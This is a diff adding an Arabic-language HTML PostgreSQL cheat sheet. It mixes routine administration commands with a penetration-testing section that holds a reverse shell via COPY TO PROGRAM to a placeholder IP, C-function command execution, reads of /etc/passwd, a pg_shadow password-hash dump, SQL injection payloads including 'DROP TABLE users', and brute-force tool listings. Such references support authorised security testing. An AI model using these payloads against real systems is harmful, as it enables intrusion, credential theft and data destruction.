@@ -1,0 +1,809 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PostgreSQL Cheat Sheet</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=IBM+Plex+Mono:wght@400;600&family=Cairo:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0d0f14;
+    --surface: #141720;
+    --surface2: #1a1f2e;
+    --border: #252b3d;
+    --accent: #00d9ff;
+    --accent2: #7c3aed;
+    --accent3: #10b981;
+    --accent4: #f59e0b;
+    --accent5: #ef4444;
+    --text: #e2e8f0;
+    --muted: #64748b;
+    --keyword: #c084fc;
+    --string: #86efac;
+    --comment: #4a5568;
+    --func: #67e8f9;
+    --number: #fbbf24;
+  }
+
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Cairo', sans-serif;
+    min-height: 100vh;
+    background-image: 
+      radial-gradient(ellipse at 10% 0%, rgba(0,217,255,0.05) 0%, transparent 50%),
+      radial-gradient(ellipse at 90% 100%, rgba(124,58,237,0.05) 0%, transparent 50%);
+  }
+
+  header {
+    padding: 40px 40px 30px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 20px;
+    position: sticky;
+    top: 0;
+    background: rgba(13,15,20,0.95);
+    backdrop-filter: blur(10px);
+    z-index: 100;
+  }
+
+  .logo {
+    width: 48px;
+    height: 48px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 12px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 24px;
+    flex-shrink: 0;
+    box-shadow: 0 0 20px rgba(0,217,255,0.3);
+  }
+
+  h1 {
+    font-size: 28px;
+    font-weight: 900;
+    background: linear-gradient(90deg, var(--accent), var(--accent2));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+  }
+
+  .subtitle {
+    font-size: 13px;
+    color: var(--muted);
+    margin-top: 2px;
+  }
+
+  .badge {
+    margin-right: auto;
+    background: rgba(0,217,255,0.1);
+    border: 1px solid rgba(0,217,255,0.3);
+    color: var(--accent);
+    padding: 4px 12px;
+    border-radius: 20px;
+    font-size: 12px;
+    font-family: 'JetBrains Mono', monospace;
+  }
+
+  .container {
+    max-width: 1400px;
+    margin: 0 auto;
+    padding: 30px 40px;
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 20px;
+  }
+
+  .section {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    overflow: hidden;
+    transition: border-color 0.2s;
+  }
+
+  .section:hover { border-color: rgba(0,217,255,0.2); }
+
+  .section.wide { grid-column: span 2; }
+  .section.full { grid-column: span 3; }
+
+  .section-header {
+    padding: 14px 18px;
+    border-bottom: 1px solid var(--border);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .section-icon {
+    width: 28px;
+    height: 28px;
+    border-radius: 7px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 14px;
+    flex-shrink: 0;
+  }
+
+  .icon-blue { background: rgba(0,217,255,0.15); }
+  .icon-purple { background: rgba(124,58,237,0.15); }
+  .icon-green { background: rgba(16,185,129,0.15); }
+  .icon-yellow { background: rgba(245,158,11,0.15); }
+  .icon-red { background: rgba(239,68,68,0.15); }
+
+  .section-title {
+    font-weight: 700;
+    font-size: 14px;
+    color: var(--text);
+  }
+
+  .section-body { padding: 14px 18px; }
+
+  /* Code blocks */
+  .code-block {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 12px 14px;
+    margin: 8px 0;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+    line-height: 1.7;
+    position: relative;
+    overflow-x: auto;
+    direction: ltr;
+  }
+
+  .code-label {
+    font-size: 10px;
+    color: var(--muted);
+    margin-bottom: 6px;
+    font-family: 'Cairo', sans-serif;
+  }
+
+  .kw { color: var(--keyword); font-weight: 600; }
+  .fn { color: var(--func); }
+  .str { color: var(--string); }
+  .cm { color: var(--comment); font-style: italic; }
+  .num { color: var(--number); }
+  .op { color: var(--accent); }
+
+  /* Table */
+  .table-wrap { overflow-x: auto; }
+  table {
+    width: 100%;
+    border-collapse: collapse;
+    font-size: 12.5px;
+    direction: ltr;
+  }
+
+  th {
+    background: var(--bg);
+    padding: 8px 12px;
+    text-align: left;
+    color: var(--muted);
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    font-weight: 600;
+    text-transform: uppercase;
+    border-bottom: 1px solid var(--border);
+  }
+
+  td {
+    padding: 8px 12px;
+    border-bottom: 1px solid rgba(37,43,61,0.5);
+    font-family: 'JetBrains Mono', monospace;
+    vertical-align: top;
+  }
+
+  td:last-child { color: var(--muted); font-family: 'Cairo', sans-serif; font-size: 12px; }
+  tr:last-child td { border-bottom: none; }
+  tr:hover td { background: rgba(255,255,255,0.02); }
+
+  .cmd { color: var(--accent); }
+  .tag { 
+    display: inline-block;
+    padding: 1px 7px;
+    border-radius: 4px;
+    font-size: 10px;
+    font-family: 'JetBrains Mono', monospace;
+    margin-right: 4px;
+  }
+  .tag-priv { background: rgba(239,68,68,0.15); color: #f87171; }
+  .tag-sql { background: rgba(0,217,255,0.1); color: var(--accent); }
+  .tag-psql { background: rgba(124,58,237,0.1); color: #a78bfa; }
+
+  /* List */
+  .item-list { list-style: none; }
+  .item-list li {
+    padding: 6px 0;
+    border-bottom: 1px solid rgba(37,43,61,0.5);
+    font-size: 13px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .item-list li:last-child { border-bottom: none; }
+  .dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent); flex-shrink: 0; }
+  .dot-red { background: var(--accent5); }
+  .dot-green { background: var(--accent3); }
+  .dot-yellow { background: var(--accent4); }
+
+  .inline-code {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    padding: 1px 6px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 11px;
+    color: var(--func);
+  }
+
+  /* Grid inside section */
+  .two-col { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
+  
+  .mini-card {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    padding: 10px 12px;
+  }
+  .mini-title { font-size: 11px; color: var(--muted); margin-bottom: 6px; }
+  .mini-code { font-family: 'JetBrains Mono', monospace; font-size: 12px; color: var(--accent); direction: ltr; }
+
+  /* Port badge */
+  .port {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    background: rgba(16,185,129,0.1);
+    border: 1px solid rgba(16,185,129,0.3);
+    color: var(--accent3);
+    padding: 3px 10px;
+    border-radius: 6px;
+    font-family: 'JetBrains Mono', monospace;
+    font-size: 12px;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <div class="logo">🐘</div>
+  <div>
+    <h1>PostgreSQL Cheat Sheet</h1>
+    <div class="subtitle">مرجع سريع للأوامر والاستعلامات</div>
+  </div>
+  <div class="badge">Port: 5432</div>
+</header>
+
+<div class="container">
+
+  <!-- Connect -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-blue">🔌</div>
+      <span class="section-title">الاتصال / Connect</span>
+    </div>
+    <div class="section-body">
+      <div class="code-label">اتصال محلي</div>
+      <div class="code-block"><span class="kw">psql</span> -U username</div>
+      <div class="code-label">اتصال عن بعد</div>
+      <div class="code-block"><span class="kw">psql</span> -h target.com -p 5432 -U username -d dbname</div>
+      <div class="code-label">تنفيذ أمر مباشر</div>
+      <div class="code-block"><span class="kw">psql</span> -h target.com -U username -c <span class="str">"SELECT version();"</span></div>
+      <div class="code-label">صيغة URL</div>
+      <div class="code-block"><span class="str">postgresql://user:pass@host:5432/dbname</span></div>
+    </div>
+  </div>
+
+  <!-- Version & Info -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-green">ℹ️</div>
+      <span class="section-title">معلومات الإصدار</span>
+    </div>
+    <div class="section-body">
+      <div class="two-col">
+        <div class="mini-card">
+          <div class="mini-title">الإصدار</div>
+          <div class="mini-code">SELECT version();</div>
+        </div>
+        <div class="mini-card">
+          <div class="mini-title">المستخدم الحالي</div>
+          <div class="mini-code">SELECT current_user;</div>
+        </div>
+        <div class="mini-card">
+          <div class="mini-title">قاعدة البيانات الحالية</div>
+          <div class="mini-code">SELECT current_database();</div>
+        </div>
+        <div class="mini-card">
+          <div class="mini-title">عنوان IP للخادم</div>
+          <div class="mini-code">SELECT inet_server_addr();</div>
+        </div>
+        <div class="mini-card">
+          <div class="mini-title">رقم الإصدار فقط</div>
+          <div class="mini-code">SHOW server_version;</div>
+        </div>
+        <div class="mini-card">
+          <div class="mini-title">جميع الإعدادات</div>
+          <div class="mini-code">SHOW all;</div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- psql Commands -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-purple">⌨️</div>
+      <span class="section-title">أوامر psql</span>
+      <span class="tag tag-psql">psql</span>
+    </div>
+    <div class="section-body">
+      <div class="table-wrap">
+        <table>
+          <tr><th>الأمر</th><th>الوصف</th></tr>
+          <tr><td class="cmd">\l</td><td>عرض كل قواعد البيانات</td></tr>
+          <tr><td class="cmd">\c dbname</td><td>الاتصال بقاعدة بيانات</td></tr>
+          <tr><td class="cmd">\dt</td><td>عرض الجداول</td></tr>
+          <tr><td class="cmd">\d table</td><td>وصف الجدول</td></tr>
+          <tr><td class="cmd">\du</td><td>عرض المستخدمين والأدوار</td></tr>
+          <tr><td class="cmd">\dn</td><td>عرض الـ schemas</td></tr>
+          <tr><td class="cmd">\df</td><td>عرض الدوال</td></tr>
+          <tr><td class="cmd">\dx</td><td>عرض الامتدادات</td></tr>
+          <tr><td class="cmd">\q</td><td>الخروج</td></tr>
+          <tr><td class="cmd">\!</td><td>تنفيذ أمر shell</td></tr>
+          <tr><td class="cmd">\timing</td><td>تفعيل توقيت الاستعلامات</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+  <!-- Databases -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-blue">🗄️</div>
+      <span class="section-title">قواعد البيانات</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- عرض كل قواعد البيانات</span>
+<span class="kw">SELECT</span> datname <span class="kw">FROM</span> pg_database;
+
+<span class="cm">-- إنشاء قاعدة بيانات</span>
+<span class="kw">CREATE DATABASE</span> mydb;
+
+<span class="cm">-- حذف قاعدة بيانات</span>
+<span class="kw">DROP DATABASE</span> mydb;
+
+<span class="cm">-- حجم قاعدة البيانات</span>
+<span class="kw">SELECT</span> pg_size_pretty(pg_database_size(<span class="str">'mydb'</span>));
+      </div>
+    </div>
+  </div>
+
+  <!-- Tables -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-green">📋</div>
+      <span class="section-title">الجداول</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- إنشاء جدول</span>
+<span class="kw">CREATE TABLE</span> employees (
+  id     <span class="fn">SERIAL PRIMARY KEY</span>,
+  name   <span class="fn">VARCHAR</span>(<span class="num">100</span>) <span class="kw">NOT NULL</span>,
+  salary <span class="fn">NUMERIC</span>(<span class="num">9</span>,<span class="num">2</span>)
+);
+
+<span class="cm">-- عرض الجداول</span>
+<span class="kw">SELECT</span> tablename <span class="kw">FROM</span> pg_tables
+<span class="kw">WHERE</span> schemaname=<span class="str">'public'</span>;
+
+<span class="cm">-- حذف جدول</span>
+<span class="kw">DROP TABLE IF EXISTS</span> employees;
+      </div>
+    </div>
+  </div>
+
+  <!-- Users & Privileges -->
+  <div class="section wide">
+    <div class="section-header">
+      <div class="section-icon icon-yellow">👤</div>
+      <span class="section-title">المستخدمون والصلاحيات</span>
+    </div>
+    <div class="section-body">
+      <div class="two-col">
+        <div>
+          <div class="code-block">
+<span class="cm">-- عرض كل المستخدمين</span>
+<span class="kw">SELECT</span> usename, usesuper, usecreatedb
+<span class="kw">FROM</span> pg_user;
+
+<span class="cm">-- إنشاء مستخدم</span>
+<span class="kw">CREATE USER</span> alice <span class="kw">WITH PASSWORD</span> <span class="str">'pass123'</span>;
+
+<span class="cm">-- منح صلاحيات</span>
+<span class="kw">GRANT ALL PRIVILEGES ON DATABASE</span> mydb <span class="kw">TO</span> alice;
+<span class="kw">GRANT ALL ON ALL TABLES IN SCHEMA</span> public <span class="kw">TO</span> alice;
+
+<span class="cm">-- سحب صلاحيات</span>
+<span class="kw">REVOKE ALL ON</span> employees <span class="kw">FROM</span> alice;
+          </div>
+        </div>
+        <div>
+          <div class="code-block">
+<span class="cm">-- تغيير كلمة مرور</span>
+\password username
+
+<span class="cm">-- ترقية لـ superuser</span>
+<span class="kw">ALTER USER</span> alice <span class="kw">WITH SUPERUSER</span>;
+
+<span class="cm">-- كشف hashes كلمات المرور</span>
+<span class="kw">SELECT</span> usename, passwd <span class="kw">FROM</span> pg_shadow;
+<span class="cm">-- ⚠️ يتطلب superuser</span>
+
+<span class="cm">-- حذف مستخدم</span>
+<span class="kw">DROP USER</span> alice;
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- CRUD -->
+  <div class="section wide">
+    <div class="section-header">
+      <div class="section-icon icon-green">✏️</div>
+      <span class="section-title">CRUD — إضافة، قراءة، تعديل، حذف</span>
+    </div>
+    <div class="section-body">
+      <div class="two-col">
+        <div>
+          <div class="code-block">
+<span class="cm">-- إضافة بيانات</span>
+<span class="kw">INSERT INTO</span> employees (name, salary)
+<span class="kw">VALUES</span> (<span class="str">'Ahmed'</span>, <span class="num">5000</span>);
+
+<span class="cm">-- قراءة بشرط</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> employees
+<span class="kw">WHERE</span> salary >= <span class="num">5000</span>
+<span class="kw">ORDER BY</span> name <span class="kw">LIMIT</span> <span class="num">10</span>;
+
+<span class="cm">-- تعديل (آمن مع BEGIN)</span>
+<span class="kw">BEGIN</span>;
+  <span class="kw">UPDATE</span> employees <span class="kw">SET</span> salary=<span class="num">6000</span>
+  <span class="kw">WHERE</span> name=<span class="str">'Ahmed'</span>;
+<span class="kw">COMMIT</span>; <span class="cm">-- أو ROLLBACK</span>
+          </div>
+        </div>
+        <div>
+          <div class="code-block">
+<span class="cm">-- حذف بشرط</span>
+<span class="kw">DELETE FROM</span> employees
+<span class="kw">WHERE</span> id = <span class="num">5</span>;
+
+<span class="cm">-- عد الصفوف</span>
+<span class="kw">SELECT COUNT</span>(*) <span class="kw">FROM</span> employees;
+
+<span class="cm">-- Nth صف</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> employees
+<span class="kw">ORDER BY</span> id
+<span class="kw">LIMIT</span> <span class="num">1</span> <span class="kw">OFFSET</span> <span class="num">4</span>; <span class="cm">-- الصف 5</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Indexes -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-blue">⚡</div>
+      <span class="section-title">الفهارس (Indexes)</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- إنشاء فهرس</span>
+<span class="kw">CREATE INDEX</span> idx_name
+<span class="kw">ON</span> employees <span class="kw">USING</span> btree (name <span class="kw">ASC</span>);
+
+<span class="cm">-- فهرس فريد</span>
+<span class="kw">CREATE UNIQUE INDEX</span> idx_email <span class="kw">ON</span> users(email);
+
+<span class="cm">-- عرض الفهارس</span>
+\di
+
+<span class="cm">-- حذف فهرس</span>
+<span class="kw">DROP INDEX</span> idx_name;
+      </div>
+    </div>
+  </div>
+
+  <!-- File Operations -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-yellow">📁</div>
+      <span class="section-title">عمليات الملفات (COPY)</span>
+      <span class="tag tag-priv">priv</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- قراءة ملف</span>
+<span class="kw">CREATE TABLE</span> tmp(t text);
+<span class="kw">COPY</span> tmp <span class="kw">FROM</span> <span class="str">'/etc/passwd'</span>;
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> tmp;
+
+<span class="cm">-- كتابة ملف</span>
+<span class="kw">COPY</span> (<span class="kw">SELECT</span> <span class="str">'data'</span>) <span class="kw">TO</span> <span class="str">'/tmp/out.txt'</span>;
+
+<span class="cm">-- تنفيذ أوامر النظام</span>
+<span class="kw">COPY</span> (<span class="kw">SELECT</span> <span class="str">''</span>) <span class="kw">TO PROGRAM</span> <span class="str">'id'</span>;
+
+<span class="cm">-- قراءة ملف مباشرة</span>
+<span class="kw">SELECT</span> <span class="fn">pg_read_file</span>(<span class="str">'/etc/passwd'</span>);
+      </div>
+    </div>
+  </div>
+
+  <!-- Command Execution -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-red">💥</div>
+      <span class="section-title">تنفيذ الأوامر (RCE)</span>
+      <span class="tag tag-priv">priv</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- COPY TO PROGRAM</span>
+<span class="kw">COPY</span> (<span class="kw">SELECT</span> <span class="str">''</span>) <span class="kw">TO PROGRAM</span>
+<span class="str">'bash -i >& /dev/tcp/IP/4444 0>&1'</span>;
+
+<span class="cm">-- دالة C مخصصة</span>
+<span class="kw">CREATE TABLE</span> tmp(data text);
+<span class="cm">-- بعد رفع الـ .so</span>
+<span class="kw">CREATE FUNCTION</span> <span class="fn">sys</span>(cstring)
+<span class="kw">RETURNS</span> int <span class="kw">AS</span> <span class="str">'/tmp/pg_exec.so'</span>,
+<span class="str">'pg_exec'</span> <span class="kw">LANGUAGE C STRICT</span>;
+<span class="kw">SELECT</span> <span class="fn">sys</span>(<span class="str">'id'</span>);
+
+<span class="cm">-- libc system()</span>
+<span class="kw">CREATE</span> <span class="fn">OR REPLACE FUNCTION</span> system(cstring)
+<span class="kw">RETURNS</span> int <span class="kw">AS</span> <span class="str">'/lib/libc.so.6'</span>,
+<span class="str">'system'</span> <span class="kw">LANGUAGE</span> <span class="str">'C'</span> <span class="kw">STRICT</span>;
+      </div>
+    </div>
+  </div>
+
+  <!-- SQL Injection -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-red">💉</div>
+      <span class="section-title">SQL Injection</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- Error-based</span>
+<span class="str">' AND 1=CAST((SELECT version()) AS int)--</span>
+
+<span class="cm">-- Union-based</span>
+<span class="str">' UNION SELECT NULL,version(),NULL--</span>
+
+<span class="cm">-- Boolean blind</span>
+<span class="str">' AND (SELECT COUNT(*) FROM pg_user</span>
+<span class="str">  WHERE usename='postgres')=1--</span>
+
+<span class="cm">-- Time-based blind</span>
+<span class="str">' AND (SELECT CASE WHEN (1=1)</span>
+<span class="str">  THEN pg_sleep(5) ELSE pg_sleep(0) END)--</span>
+
+<span class="cm">-- Stacked queries</span>
+<span class="str">'; DROP TABLE users;--</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Enumeration -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-purple">🔍</div>
+      <span class="section-title">الاستكشاف (Enumeration)</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- جميع قواعد البيانات</span>
+<span class="kw">SELECT</span> datname <span class="kw">FROM</span> pg_database;
+
+<span class="cm">-- عثور على أعمدة حساسة</span>
+<span class="kw">SELECT</span> table_name, column_name
+<span class="kw">FROM</span> information_schema.columns
+<span class="kw">WHERE</span> column_name <span class="kw">LIKE</span> <span class="str">'%password%'</span>
+   <span class="kw">OR</span> column_name <span class="kw">LIKE</span> <span class="str">'%token%'</span>;
+
+<span class="cm">-- Superusers</span>
+<span class="kw">SELECT</span> usename <span class="kw">FROM</span> pg_user
+<span class="kw">WHERE</span> usesuper = <span class="kw">true</span>;
+
+<span class="cm">-- الامتدادات المثبتة</span>
+<span class="kw">SELECT</span> extname, extversion <span class="kw">FROM</span> pg_extension;
+      </div>
+    </div>
+  </div>
+
+  <!-- Backup & Restore -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-green">💾</div>
+      <span class="section-title">النسخ الاحتياطي والاستعادة</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm"># نسخ قاعدة بيانات</span>
+<span class="kw">pg_dump</span> mydb > mydb.sql
+
+<span class="cm"># نسخ بصيغة مخصصة</span>
+<span class="kw">pg_dump</span> -Fc mydb > mydb.dump
+
+<span class="cm"># نسخ كل قواعد البيانات</span>
+<span class="kw">pg_dumpall</span> > all.sql
+
+<span class="cm"># استعادة</span>
+<span class="kw">psql</span> -U postgres -f mydb.sql
+<span class="kw">pg_restore</span> -d mydb mydb.dump
+      </div>
+    </div>
+  </div>
+
+  <!-- Maintenance -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-yellow">🔧</div>
+      <span class="section-title">الصيانة</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- تنظيف الفضاء</span>
+<span class="kw">VACUUM</span> employees;
+<span class="kw">VACUUM</span>(verbose, analyze) employees;
+
+<span class="cm">-- تحديث الإحصائيات</span>
+<span class="kw">ANALYZE</span> employees;
+
+<span class="cm">-- إيقاف استعلام</span>
+<span class="kw">SELECT</span> <span class="fn">pg_cancel_backend</span>(pid);
+
+<span class="cm">-- مراقبة الجلسات</span>
+<span class="kw">SELECT</span> pid, usename, state, query
+<span class="kw">FROM</span> pg_stat_activity;
+      </div>
+    </div>
+  </div>
+
+  <!-- Large Objects -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-purple">📦</div>
+      <span class="section-title">Large Objects</span>
+      <span class="tag tag-priv">priv</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="cm">-- إنشاء large object</span>
+<span class="kw">SELECT</span> <span class="fn">lo_create</span>(<span class="num">12345</span>);
+
+<span class="cm">-- استيراد ملف</span>
+<span class="kw">SELECT</span> <span class="fn">lo_import</span>(<span class="str">'/etc/passwd'</span>, <span class="num">12345</span>);
+
+<span class="cm">-- قراءة</span>
+<span class="kw">SELECT</span> <span class="fn">convert_from</span>(<span class="fn">lo_get</span>(<span class="num">12345</span>),<span class="str">'UTF8'</span>);
+
+<span class="cm">-- تصدير</span>
+<span class="kw">SELECT</span> <span class="fn">lo_export</span>(<span class="num">12345</span>, <span class="str">'/tmp/file'</span>);
+
+<span class="cm">-- حذف</span>
+<span class="kw">SELECT</span> <span class="fn">lo_unlink</span>(<span class="num">12345</span>);
+      </div>
+    </div>
+  </div>
+
+  <!-- String Functions -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-blue">🔤</div>
+      <span class="section-title">دوال النصوص</span>
+    </div>
+    <div class="section-body">
+      <div class="code-block">
+<span class="fn">length</span>(<span class="str">'hello'</span>)            <span class="cm">-- 5</span>
+<span class="fn">upper</span>(<span class="str">'hello'</span>)            <span class="cm">-- HELLO</span>
+<span class="fn">lower</span>(<span class="str">'WORLD'</span>)            <span class="cm">-- world</span>
+<span class="fn">substr</span>(<span class="str">'abcdef'</span>, <span class="num">2</span>, <span class="num">3</span>)    <span class="cm">-- bcd</span>
+<span class="fn">trim</span>(<span class="str">'  hello  '</span>)         <span class="cm">-- hello</span>
+<span class="fn">replace</span>(<span class="str">'a,b'</span>, <span class="str">','</span>, <span class="str">'|'</span>) <span class="cm">-- a|b</span>
+<span class="fn">position</span>(<span class="str">'lo'</span> <span class="kw">IN</span> <span class="str">'hello'</span>) <span class="cm">-- 4</span>
+<span class="fn">chr</span>(<span class="num">65</span>)                    <span class="cm">-- A</span>
+<span class="fn">ascii</span>(<span class="str">'A'</span>)                 <span class="cm">-- 65</span>
+<span class="str">'A'</span> <span class="op">||</span> <span class="str">'B'</span>                 <span class="cm">-- AB</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Security Misconfigs -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-red">⚠️</div>
+      <span class="section-title">أخطاء الإعداد الشائعة</span>
+    </div>
+    <div class="section-body">
+      <ul class="item-list">
+        <li><span class="dot dot-red"></span>بيانات الدخول الافتراضية <span class="inline-code">postgres:postgres</span></li>
+        <li><span class="dot dot-red"></span>كلمات مرور ضعيفة</li>
+        <li><span class="dot dot-red"></span>superuser متاح عن بعد</li>
+        <li><span class="dot dot-red"></span>pg_hba.conf يسمح بـ trust auth</li>
+        <li><span class="dot dot-red"></span>بدون SSL/TLS</li>
+        <li><span class="dot dot-red"></span>COPY PROGRAM مفعّل لغير superuser</li>
+        <li><span class="dot dot-red"></span>امتدادات غير ضرورية مثبتة</li>
+        <li><span class="dot dot-red"></span>التسجيل (logging) معطّل</li>
+        <li><span class="dot dot-red"></span>إصدار قديم من PostgreSQL</li>
+        <li><span class="dot dot-red"></span>بدون حدود للاتصالات</li>
+      </ul>
+    </div>
+  </div>
+
+  <!-- Config Files -->
+  <div class="section">
+    <div class="section-header">
+      <div class="section-icon icon-yellow">📍</div>
+      <span class="section-title">ملفات الإعداد</span>
+    </div>
+    <div class="section-body">
+      <ul class="item-list">
+        <li><span class="dot dot-yellow"></span><span class="inline-code">SHOW config_file;</span></li>
+        <li><span class="dot dot-yellow"></span><span class="inline-code">SHOW hba_file;</span></li>
+        <li><span class="dot dot-yellow"></span><span class="inline-code">SHOW data_directory;</span></li>
+        <li><span class="dot dot-yellow"></span><span class="inline-code">SHOW log_directory;</span></li>
+      </ul>
+      <div class="code-block" style="margin-top:10px">
+<span class="cm"># مسارات شائعة</span>
+/etc/postgresql/<span class="num">14</span>/main/postgresql.conf
+/etc/postgresql/<span class="num">14</span>/main/pg_hba.conf
+/var/lib/postgresql/data/
+      </div>
+    </div>
+  </div>
+
+  <!-- Tools -->
+  <div class="section full">
+    <div class="section-header">
+      <div class="section-icon icon-blue">🛠️</div>
+      <span class="section-title">الأدوات المفيدة</span>
+    </div>
+    <div class="section-body">
+      <div class="table-wrap">
+        <table>
+          <tr><th>الأداة</th><th>الوصف</th><th>الاستخدام الرئيسي</th></tr>
+          <tr><td class="cmd">psql</td><td>عميل PostgreSQL</td><td>الوصول المباشر لقاعدة البيانات</td></tr>
+          <tr><td class="cmd">pg_dump</td><td>نسخ احتياطي لقاعدة بيانات</td><td>استخراج البيانات</td></tr>
+          <tr><td class="cmd">pg_dumpall</td><td>نسخ كل قواعد البيانات</td><td>نسخ احتياطي كامل</td></tr>
+          <tr><td class="cmd">pgAdmin</td><td>واجهة رسومية GUI</td><td>إدارة قاعدة البيانات</td></tr>
+          <tr><td class="cmd">sqlmap</td><td>أداة SQL injection تلقائية</td><td>اختبار الاختراق</td></tr>
+          <tr><td class="cmd">hydra</td><td>تكسير كلمات المرور</td><td>هجمات Brute Force</td></tr>
+          <tr><td class="cmd">hashcat</td><td>استعادة كلمات المرور</td><td>كسر الـ hashes</td></tr>
+          <tr><td class="cmd">nmap</td><td>مسح الشبكة</td><td>اكتشاف الخدمات</td></tr>
+          <tr><td class="cmd">metasploit</td><td>إطار الاستغلال</td><td>اختبار تلقائي</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+</body>
+</html>
